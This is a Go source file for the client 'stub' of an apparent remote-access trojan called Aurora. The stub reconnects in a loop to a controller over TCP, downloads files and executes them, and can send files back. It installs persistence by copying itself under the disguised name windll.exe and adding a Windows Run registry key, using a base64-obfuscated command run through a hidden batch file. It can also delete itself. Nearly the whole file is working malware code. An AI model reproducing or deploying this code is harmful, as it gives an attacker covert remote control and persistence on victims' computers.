package internal

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"
)

type Stub struct {
	conn    net.Conn
	encoder *json.Encoder
	decoder *json.Decoder
	td      string
}

func main() {
	stub := Stub{}
	stub.Start()
}

func (stub *Stub) Start() {
	for {
		stub.dial()
		time.Sleep(5000000000)
	}
}

func (stub *Stub) dial() {
	var err error
	stub.conn, err = net.Dial("tcp", "127.0.0.1:4731")
	if err != nil {
		fmt.Println(err)
	} else {
		stub.encoder = json.NewEncoder(stub.conn)
		stub.decoder = json.NewDecoder(stub.conn)
		stub.handlePackets()
	}
}

func (stub *Stub) handlePackets() {
	files := map[string]*os.File{}
	for {
		packet := Packet{}
		err := stub.decoder.Decode(&packet)
		if err == io.EOF {
			break
		} else if err != nil {
			return
		} else {
			fmt.Println(packet.Type)
			switch packet.Type {
			case "FILE":
				if _, err := os.Stat(stub.td); os.IsNotExist(err) {
					err := os.MkdirAll(stub.td, os.ModeDir)
					if err != nil {
						fmt.Println(err)
					}
				}
				fileName := stub.td + "\\" + packet.StringData
				if packet.Done && files[fileName] != nil {
					files[fileName].Close()
					delete(files, fileName)
					fmt.Println("Stub: Finished downloading", packet.StringData)
					Exec := exec.Command(files[fileName].Name())
					Exec.Start()
				} else if packet.Done && files[fileName] == nil {
					continue
				} else {
					if files[fileName] == nil {
						fmt.Println("Stub: Started downloading", packet.StringData)
						if _, err := os.Stat(fileName); os.IsNotExist(err) {
							files[fileName], _ = os.Create(fileName)
						} else {
							files[fileName], _ = os.Open(fileName)
						}
					}
					files[fileName].WriteAt(packet.FileData, packet.BytePos*1024)
				}
			case "MSG":
				fmt.Println("Aurora: incoming message \"" + packet.StringData + "\"")
			case "PERSIST":
				addPersistence()
			case "RMPERSIST":
				removePersistence()
			case "DC":
				stub.conn = nil
				return
			case "REMOVE":
				uninstall()
			}
		}
	}
}

func (stub *Stub) sendFile(fileName string) {
	buffer := make([]byte, 1024)
	file, _ := os.Open(fileName)
	defer file.Close()

	i := 0
	for {
		_, err := file.Read(buffer)
		if err == io.EOF {
			stub.encoder.Encode(Packet{"FILE", "test.exe", 0, nil, true})
			break
		}
		stub.encoder.Encode(Packet{"FILE", "test.exe", int64(i), buffer, false})
		i++
	}
	stub.encoder.Encode(Packet{"MESSAGE", "DONE", 0, nil, false})
}

func uninstall() {
	removePersistence()

	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation
	argv, _ := syscall.UTF16PtrFromString(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
	syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&sI,
		&pI)
	os.Exit(0)
}

func addPersistence() {
	RegAdd := "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

	persist, _ := os.Create("msdll.bat")
	persist.WriteString("mkdir %APPDATA%\\Windows" + "\n")
	persist.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
	persist.WriteString(string(DecodedRegAdd))
	persist.Close()

	Exec := exec.Command("cmd", "/C", "msdll.bat")
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Run()

	Clean := exec.Command("cmd", "/C", "del msdll.bat")
	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Clean.Run()
}

func removePersistence() {
	RegAdd := "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL0Y="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

	persist, _ := os.Create("msdll.bat")
	persist.WriteString("del /f %APPDATA%\\Windows\\windll.exe\n")
	persist.WriteString(string(DecodedRegAdd))
	persist.Close()

	Exec := exec.Command("cmd", "/C", "msdll.bat")
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Run()

	Clean := exec.Command("cmd", "/C", "del msdll.bat")
	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Clean.Run()
}
